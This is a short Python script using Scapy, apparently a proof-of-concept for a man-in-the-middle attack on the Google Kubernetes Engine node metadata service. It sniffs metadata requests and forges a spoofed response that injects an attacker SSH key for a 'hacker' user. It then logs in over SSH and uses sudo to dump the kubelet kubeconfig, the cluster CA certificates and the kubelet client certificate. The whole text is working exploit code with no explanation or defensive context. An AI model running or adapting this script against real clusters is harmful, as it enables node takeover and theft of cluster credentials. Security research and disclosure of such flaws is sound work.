# GKE Metadata Mitm Scapy
# Etienne Champetier (@champtar)

from scapy.all import *
conf.verb = 0 # turn off scapy messages
import urllib.request, json, os, time

# https://scapy.readthedocs.io/en/latest/troubleshooting.html#i-can-t-ping-127-0-0-1-scapy-does-not-work-with-127-0-0-1-or-on-the-loopback-interface
conf.L3socket=L3RawSocket

def start():
    print("Loading ssh key")
    global sshkey
    with open('/root/.ssh/id_ed25519.pub') as f:
        sshkey = f.read().strip()
    print(sshkey)

    print("Listening for metadata requests...")
    sniff(prn=inject,
          filter='host 169.254.169.254 and tcp port 80',
          lfilter=lambda p: all([m in str(p[TCP].payload) for m in ['GET /computeMetadata/v1/?','recursive=True','wait_for_change=True']])
    )

def inject(p):
    print('Request')
    print(p[TCP].payload)
    print('Preparing response')
    response = forge_response(p)
    print('Sending response')
    send(response)
    print('Trying to exec')
    time.sleep(1)
    print('================================================================================')
    os.system('ssh -oStrictHostKeyChecking=no hacker@127.0.0.1 -- sudo cat /var/lib/kubelet/kubeconfig /etc/srv/kubernetes/pki/ca-certificates.crt /var/lib/kubelet/pki/kubelet-client-current.pem')
    print('================================================================================')

def get_metadata():
    url = 'http://169.254.169.254/computeMetadata/v1/?alt=json&recursive=True'
    headers = {
            'Accept-Encoding': 'identity',
            'Host': 'metadata.google.internal',
            'Metadata-Flavor': 'Google',
            'Connection': 'close',
            'User-Agent': 'Python-urllib/2.7'
            }
    return urllib.request.urlopen(urllib.request.Request(url, headers=headers))

def forge_response(p):
    ip = IP(src=p[IP].dst, dst=p[IP].src)
    tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq + 1, flags="AP")

    meta = get_metadata()
    j = json.load(meta)
    j['project']['attributes']['ssh-keys'] += "\nhacker:" + sshkey
    j = json.dumps(j)

    r = "HTTP/1.1 200 OK\r\n"
    h = meta.getheaders()
    h.append(('Connection', 'Close'))
    for k,v in h:
        if k == 'Content-Length':
            v = str(len(j))
        r += "{}: {}\r\n".format(k,v)
    r += "\r\n"
    r += j

    return ip / tcp / r

start()

